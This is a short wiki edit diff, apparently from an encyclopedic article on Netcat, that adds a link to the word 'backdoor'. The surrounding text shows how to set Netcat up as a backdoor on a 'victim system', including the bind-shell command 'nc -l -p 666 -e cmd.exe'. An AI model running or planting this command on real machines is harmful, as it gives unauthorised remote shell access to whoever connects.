@@ -227,7 +227,7 @@ One simple but effective [[tool]] for testing connectivity is Netcat (nc), avail
 
 echo "head" | nc 10.1.0.1 -v 80
 
-Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:
+Netcat can also establish connections with remote machines. To configure Netcat as a [[backdoor]], you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:
 
 nc -l -p 666 -e cmd.exe
 
